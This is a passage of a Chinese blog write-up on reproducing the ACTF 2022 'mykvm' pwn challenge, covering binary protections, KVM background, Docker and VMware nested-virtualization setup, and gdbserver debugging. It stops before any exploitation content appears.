<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="mykvm 复现 123456789101112131415161718service ctf&amp;#123;    disable &#x3D; no    socket_type &#x3D; stream    protocol    &#x3D; tcp    wait        &#x3D; no    user        &#x3D; root    type        &#x3D; UNLISTED    port        &#x3D;">
<meta property="og:type" content="article">
<meta property="og:title" content="KVM pwn">
<meta property="og:url" content="http://example.com/2022/07/12/KVM%20pwn/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:description" content="mykvm 复现 123456789101112131415161718service ctf&amp;#123;    disable &#x3D; no    socket_type &#x3D; stream    protocol    &#x3D; tcp    wait        &#x3D; no    user        &#x3D; root    type        &#x3D; UNLISTED    port        &#x3D;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/07/12/KVM%20pwn/1657352744964.png">
<meta property="og:image" content="http://example.com/2022/07/12/KVM%20pwn/1657269118245.png">
<meta property="og:image" content="http://example.com/2022/07/12/KVM%20pwn/1657269160910.png">
<meta property="og:image" content="http://example.com/2022/07/12/KVM%20pwn/1657603737686.png">
<meta property="og:image" content="http://example.com/2022/07/12/KVM%20pwn/1657603860296.png">
<meta property="article:published_time" content="2022-07-12T09:27:37.000Z">
<meta property="article:modified_time" content="2022-07-12T09:28:25.725Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="KVM pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/07/12/KVM%20pwn/1657352744964.png">

<link rel="canonical" href="http://example.com/2022/07/12/KVM%20pwn/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>KVM pwn | Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/12/KVM%20pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          KVM pwn
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-07-12 17:27:37 / Modified: 17:28:25" itemprop="dateCreated datePublished" datetime="2022-07-12T17:27:37+08:00">2022-07-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong>mykvm 复现</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    <span class="built_in">type</span>        = UNLISTED</span><br><span class="line">    port        = <span class="number">8888</span></span><br><span class="line">    bind        = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">    server      = /home/ctf/mykvm</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    <span class="comment"># safety options</span></span><br><span class="line">    per_source	= <span class="number">10</span> <span class="comment"># the maximum instances of this service per source IP address</span></span><br><span class="line">    rlimit_cpu	= <span class="number">20</span> <span class="comment"># the maximum number of CPU seconds that the service may use</span></span><br><span class="line">    <span class="comment">#rlimit_as  = 1024M # the Address Space resource limit for the service</span></span><br><span class="line">    <span class="comment">#access_times = 2:00-9:00 12:00-24:00</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mykvm: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">1993</span>c72c363459deb6e3280880959d1f83620724, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，开了 NX，Canary，FORTIFY</li>
</ul>
<p>运行时出现以下报错：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./mykvm </span><br><span class="line">./mykvm: error <span class="keyword">while</span> loading shared libraries: libreadline.so<span class="number">.6</span>: cannot open shared object file: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure>
<ul>
<li>证明系统已经升级 libreadline.so.6 到 libreadline.so.7 或者 libreadline.so.8</li>
</ul>
<p>使用以下命令就可以解决：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  x86_64-linux-gnu sudo ln -s libreadline.so<span class="number">.8</span><span class="number">.0</span> libreadline.so<span class="number">.6</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我的电脑上是 libreadline.so.8，如果是 libreadline.so.7 修改命令即可</li>
</ul>
<p>拖入 IDA 分析，发现如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/dev/kvm&quot;</span>, <span class="number">524290</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  errx(<span class="number">1</span>, <span class="string">&quot;failed to open /dev/kvm&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>在我的 ubuntu 上没有 <code>/dev/kvm</code></li>
<li>学习 kvm：<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_1054383/1664143">/dev/kvm简单理解</a></li>
</ul>
<p>学习了一下陌生的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">readline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *prompt)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>prompt：指向提示字符串</li>
<li>readline 的返回值就是该行文本的指针：<ul>
<li>如果是一个空行,那么将返回一个空的字符串</li>
<li>如果在读某一行的过程中遇到了EOF错误，并且是空行的话，便会返回NULL</li>
<li>如果不是空行的话，便会将其当做新的一行</li>
</ul>
</li>
<li>返回值由 malloc() 分配的空间存储，故调用结束后应通过 free() 显式地释放内存 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_history</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">string</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>我们希望输入过的命令行，还可以通过 <code>C-p</code> 或者 <code>C-s</code> 来搜索到，那么就需要将命令行加入到历史列表中，可以调用 <code>add_history()</code> 函数来完成</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offsize)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>start：指向欲对应的内存起始地址，通常设为NULL，代表让系统自动选定地址，对应成功后该地址会返回</li>
<li>length：代表将要把文件映射到内存的字节大小</li>
<li>prot：代表映射区域的保护方式 </li>
<li>flags：会影响映射区域的各种特性</li>
<li>fd：文件描述词，代表欲映射到内存的文件</li>
<li>offset：文件映射的偏移量，通常设置为“0”，代表从文件最前方开始对应，offset 必须是分页大小的整数倍</li>
</ul>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hazir/p/instruction_to_readline.html">GNU Readline 库及编程简介</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7e7a43e98957">mmap函数详解与代码实操</a> </li>
</ul>
<p><strong>KVM (kernel-based virtual machine) 简述</strong></p>
<p><code>/dev/kvm</code> 设备是 kvm(kernel-based virtual machine) 虚拟机的一个设备文件</p>
<p>一，qemu 是一个模拟软件，运行于 linux 的用户空间，qemu 可以模拟我们能见到的所有操作系统，由于是通过模拟的方法来实现系统虚拟化，它产生的所有 CPU 指令都翻译转换一次，因此其性能非常低</p>
<p>二，kvm 是一个运行于内核空间的程序，为了提供一个整体的解决方案（包括用户空间工具集[由qemu提供]，管理各种设备[由kvm内核模块提供]），kvm 开发团队借用了 qemu 代码，并作了一些修改，形成了一套工具，也就是 qemu-kvm（不是linux中的命令） </p>
<p>三，<code>/dev/kvm</code> 是一个字符设备，其核心作用就是让 qemu 与 kvm 内核模块结合起来，当 qemu 打开这个设备后，通过 ioctl 这个系统调用就可以获得 kvm 模块提供的三个抽象对象：</p>
<ul>
<li>kvm：代表 kvm 模块本身，用来管理 kvm 版本信息，创建一个 vm(通过)</li>
<li>vm：代表一个虚拟机，通过 vm 的 io_ctl 接口，可以为虚拟机创建 vcpu，设置内存区间，创建中断控制芯片，分配中断等等</li>
<li>vcpu：代表一个 vcpu，通过 vcpu 的 io_ctl 接口，可以启动或者暂停 vcpu，设置 vcpu 的寄存器，为 vcpu 注入中断等等</li>
</ul>
<p>Qemu 的使用方式:</p>
<ul>
<li>打开 /dev/kvm 设备</li>
<li>通过 KVM_CREATE_VM 创建一个虚拟机对象</li>
<li>通过 KVM_CREATE_VCPU 为虚拟机创建 vcpu 对象</li>
<li>通过 KVM_RUN 设置 vcpu 运行起来</li>
</ul>
<p>因此，<code>/dev/kvm</code> 只是 kvm 内核模块提供给用户空间的一个接口，这个接口被 qemu-kvm 调用，通过 ioctl 系统调用就可以给用户提供一个工具用以创建，删除，管理虚拟机</p>
<p><strong>Docker 搭建环境</strong></p>
<p>题目给了 Dockerfile：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:16.04</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd gdb vim python git</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 8888</span><br></pre></td></tr></table></figure>
<p>在目录下执行以下命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build .</span><br></pre></td></tr></table></figure>
<p>第一个 images 就是目标了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ywx813@DESKTOP-I5DPK9O MINGW64 ~/Desktop/<span class="number">2022</span>暑假复现/actf2022_mykvm/docker</span><br><span class="line">$ docker images</span><br><span class="line">REPOSITORY        TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">&lt;none&gt;            &lt;none&gt;    <span class="number">94</span>c320b3bb31   <span class="number">2</span> minutes ago   <span class="number">760</span>MB</span><br><span class="line">docker_fpm        latest    <span class="number">842968b</span>ef75b   <span class="number">7</span> days ago      <span class="number">461</span>MB</span><br><span class="line">docker_nginx      latest    <span class="number">51</span>a1d3e9b89d   <span class="number">7</span> days ago      <span class="number">150</span>MB</span><br><span class="line">pwn_ubuntu20<span class="number">.04</span>   <span class="number">20.04</span>     dda29e818595   <span class="number">6</span> months ago    <span class="number">2.25</span>GB</span><br><span class="line"></span><br><span class="line">ywx813@DESKTOP-I5DPK9O MINGW64 ~/Desktop/<span class="number">2022</span>暑假复现/actf2022_mykvm/docker</span><br><span class="line">$ docker tag <span class="number">94</span>c320b3bb31 mykvm:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line">ywx813@DESKTOP-I5DPK9O MINGW64 ~/Desktop/<span class="number">2022</span>暑假复现/actf2022_mykvm/docker</span><br><span class="line">$ docker images</span><br><span class="line">REPOSITORY        TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">mykvm             <span class="number">16.04</span>     <span class="number">94</span>c320b3bb31   <span class="number">5</span> minutes ago   <span class="number">760</span>MB</span><br><span class="line">docker_fpm        latest    <span class="number">842968b</span>ef75b   <span class="number">7</span> days ago      <span class="number">461</span>MB</span><br><span class="line">docker_nginx      latest    <span class="number">51</span>a1d3e9b89d   <span class="number">7</span> days ago      <span class="number">150</span>MB</span><br><span class="line">pwn_ubuntu20<span class="number">.04</span>   <span class="number">20.04</span>     dda29e818595   <span class="number">6</span> months ago    <span class="number">2.25</span>GB</span><br></pre></td></tr></table></figure>
<p>尝试在 docker 中运行题目文件：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="string">bin</span>  <span class="string">dev</span>  <span class="string">flag</span>  <span class="string">lib</span>  <span class="string">lib32</span>  <span class="string">mykvm</span></span><br><span class="line"><span class="comment"># ./mykvm</span></span><br><span class="line"><span class="attr">your code size:</span></span><br><span class="line"><span class="number">400</span></span><br><span class="line"><span class="attr">your code:</span></span><br><span class="line"><span class="string">yhellow</span></span><br><span class="line"><span class="attr">guest name:</span> <span class="string">yhellow</span></span><br><span class="line"><span class="attr">guest passwd:</span> <span class="string">yhellow</span></span><br><span class="line"><span class="attr">mykvm:</span> <span class="string">failed</span> <span class="string">to</span> <span class="string">open</span> <span class="string">/dev/kvm</span></span><br></pre></td></tr></table></figure>
<ul>
<li>docker 没有 <code>/dev/kvm</code>，只能想其他办法</li>
<li>PS：启动 docker 时需要添加 -privilage 参数，来允许在 docker 使用 kvm </li>
</ul>
<p><strong>VMware Workstation 16 搭建环境</strong></p>
<p>输入下面的<code>grep</code>命令来看看是否支持硬件虚拟化： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin grep -Eoc <span class="string">&#x27;(vmx|svm)&#x27;</span> /proc/cpuinfo</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果 CPU 支持硬件虚拟化，这个命令将会打印出大于“0”的数字，这代表 CPU 核心数目</li>
<li>否则，如果输出为“0”，它意味着这个 CPU 不支持硬件虚拟化</li>
</ul>
<p>在一些机器上，虚拟化技术可能被厂商在 BIOS 中禁用了，运行下面的命令可以进行查看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/kvm-ok <span class="comment">/* kvm-ok需要安装 */</span></span><br></pre></td></tr></table></figure>
<p>也可以通过任务管理器查看：</p>
<img src="/2022/07/12/KVM%20pwn/1657352744964.png" class width="1657352744964"> 
<ul>
<li>已经在BIOS中开启了VT功能</li>
</ul>
<p>关闭虚拟机，在虚拟机设置中勾选 <code>虚拟化引擎</code> 中的前两个：</p>
<img src="/2022/07/12/KVM%20pwn/1657269118245.png" class width="1657269118245">  
<p>得到报错：</p>
<img src="/2022/07/12/KVM%20pwn/1657269160910.png" class width="1657269160910"> 
<p>参考以下博客：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46499134/article/details/124231658?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-124231658-blog-106523106.pc_relevant_multi_platform_whitelistv1&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-124231658-blog-106523106.pc_relevant_multi_platform_whitelistv1&amp;utm_relevant_index=1">关于“ VMware Workstation 16 此平台不支持虚拟化的Intel VT-x/EPT</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Officialcareer/article/details/120800562">VMware Workstation 16 在此主机上不支持嵌套虚拟化 修复方法</a> </li>
</ul>
<p>最后问题终于解决了（但是 win docker 的环境挂了），要完全关闭 Hyper-V，WSL，同时还要关闭内核隔离（虚拟机访问物理资源时需要通过 VMM 去建立一个虚拟的Ring0权限，内核隔离开启后，默认会启动 Hyper-V）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin grep -Eoc <span class="string">&#x27;(vmx|svm)&#x27;</span> /proc/cpuinfo</span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure>
<p><strong>调试方法</strong></p>
<p>为了调试环境与题目环境一样，只能使用 docker，但是 win 中的 docker 环境挂了…</p>
<p>最后选择在 ubuntu 中下载了一个 docker，然后利用 Dockerfile 直接在 ubuntu 上搭环境：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t mykvm -f Dockerfile .</span><br></pre></td></tr></table></figure>
<p>然后即可启动，一定要后台启动才能跟远程堆环境保持一致，另外还要加 <code>--privileged</code> 参数以便在 docker 内访问 kvm 设备 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  docker docker container run --privileged -p <span class="number">1234</span>:<span class="number">1234</span> -p <span class="number">8000</span>:<span class="number">8888</span> -d mykvm</span><br><span class="line"><span class="number">4b</span>1755d23dc28a56ffafa5ec9cbd5fc0fcb1625a90c0cde88ab3d8ebe8e71f65</span><br><span class="line">➜  docker docker exec -it <span class="number">4b</span>1755d23dc28a5 /bin/bash </span><br><span class="line">root@<span class="number">4b</span>1755d23dc2:/home/ctf# </span><br></pre></td></tr></table></figure>
<p>接下来就可以进入 docker 使用 gdbserver 挂调试器，然后外部连入调试即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">9622b</span>ccfc102:/home/ctf<span class="meta"># ip addr show</span></span><br><span class="line"><span class="number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="number">65536</span> qdisc noqueue state UNKNOWN group <span class="keyword">default</span> qlen <span class="number">1000</span></span><br><span class="line">    link/loopback <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> brd <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">    inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8</span> scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">5</span>: eth0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue state UP group <span class="keyword">default</span> </span><br><span class="line">    link/ether <span class="number">02</span>:<span class="number">42</span>:ac:<span class="number">11</span>:<span class="number">00</span>:<span class="number">02</span> brd ff:ff:ff:ff:ff:ff link-netnsid <span class="number">0</span></span><br><span class="line">    inet <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>/<span class="number">16</span> brd <span class="number">172.17</span><span class="number">.255</span><span class="number">.255</span> scope global eth0</span><br><span class="line">       valid_lft forever preferred_</span><br></pre></td></tr></table></figure>
<ul>
<li>docker IP addr：172.17.0.2</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>@<span class="number">9622</span>bccfc<span class="number">102</span>:/home/ctf# gdbserver <span class="number">127.0.0.1:7777</span> ./mykvm</span><br><span class="line"><span class="attribute">Process</span> ./mykvm created; pid = <span class="number">251</span></span><br><span class="line"><span class="attribute">Listening</span> <span class="literal">on</span> port <span class="number">7777</span></span><br><span class="line"><span class="attribute">Remote</span> debugging from host <span class="number">172.17.0.1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>gdbserver port：7777</li>
</ul>
<p>然后再外部使用以下命令进行连接：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">7777</span></span><br></pre></td></tr></table></figure>
<p><strong>KVM api 使用案例</strong></p>
<p>首先，我们需要打开 <code>/dev/kvm</code>：</p>
